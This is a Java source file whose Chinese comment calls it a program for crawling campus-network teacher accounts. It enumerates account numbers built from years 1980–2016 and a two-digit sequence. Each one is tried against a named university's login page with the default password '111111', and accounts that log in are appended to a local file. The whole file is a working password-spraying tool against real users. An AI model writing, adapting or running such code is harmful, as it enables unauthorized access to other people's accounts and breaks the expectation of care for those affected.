package site.wetsion.drpub.mainservice;

import java.io.File;
import java.io.FileNotFoundException;
import java.io.FileWriter;
import java.io.IOException;
import java.net.MalformedURLException;
import java.util.ArrayList;
import java.util.List;

import org.slf4j.Logger;
import org.slf4j.LoggerFactory;

import com.gargoylesoftware.htmlunit.FailingHttpStatusCodeException;
import com.gargoylesoftware.htmlunit.WebClient;
import com.gargoylesoftware.htmlunit.html.HtmlElement;
import com.gargoylesoftware.htmlunit.html.HtmlForm;
import com.gargoylesoftware.htmlunit.html.HtmlPage;
import com.gargoylesoftware.htmlunit.html.HtmlPasswordInput;
import com.gargoylesoftware.htmlunit.html.HtmlTextInput;

import site.wetsion.drpub.inferface.AbsractService;
/**
 * 校园网教师账号爬取程序
 * @author Wetsion
 *
 */
public class TvService extends AbsractService implements Runnable{

	private final static Logger log = LoggerFactory.getLogger(TvService.class);
	
	private static final String URL = "http://tv.tcu.edu.cn/index.php/Account/login";

	private String account;
	
	public void setAccount(String account) {
		this.account = account;
	}

	public void login(String account){
		WebClient client = initWebClient();
		System.out.println("测试账号"+account);
		try {
			HtmlPage page = client.getPage(URL);
			final HtmlForm form = page.getForms().get(0);
			
			HtmlTextInput input_username = form.getInputByName("account");
			input_username.setText(account);
			HtmlPasswordInput input_pwd = form.getInputByName("password");
			input_pwd.setText("111111");
			
			HtmlElement loginbtn = (HtmlElement) page.getElementById("commit");
			
			page = loginbtn.click();
			String targeturl = "http://tv.tcu.edu.cn/index.php/index/index";
			String forwardurl = page.getUrl().toString().trim();
			if(targeturl.equals(forwardurl)){
				System.out.println("登录成功");
				write(account);
			}else{
				System.out.println(account+"登录失败"+forwardurl);
			}
			page.cleanUp();
			client.closeAllWindows();
		} catch (FailingHttpStatusCodeException e) {
			log.error(e.getMessage());
		} catch (MalformedURLException e) {
			log.error(e.getMessage());
		} catch (IOException e) {
			log.error(e.getMessage());
		}
	}
	
	private void write(String account){
		File file = new File("E:\\avliaccount.txt");
		StringBuilder builder = new StringBuilder(account);
		builder.append("\n");
		FileWriter fileWriter;
		try {
			fileWriter = new FileWriter(file, true);
			fileWriter.write(builder.toString());
			fileWriter.close();
		} catch (IOException e) {
			log.error(e.getMessage());
		}
	}
	
	public static void main(String[] args) {
		
//		service.login("1990003");
//		List<String> nums = new ArrayList<String>();
		for (int i = 1980;i<2017;i++) {
			for (int j = 1;j<100;j++) {
				if (j<10) {
					StringBuilder builder = new StringBuilder();
					builder.append(i).append("00").append(j);
//					.append("\n");
//					String num = builder.toString();
//					nums.add(num);
					TvService service = new TvService();
					service.login(builder.toString());
				} else {
					StringBuilder builder = new StringBuilder();
					builder.append(i).append("0").append(j);
//					.append("\n");
//					String num = builder.toString();
//					nums.add(num);
					TvService service = new TvService();
					service.login(builder.toString());
				}
			}
		}
	}

	public void run() {
		login(account);
	}
	
}
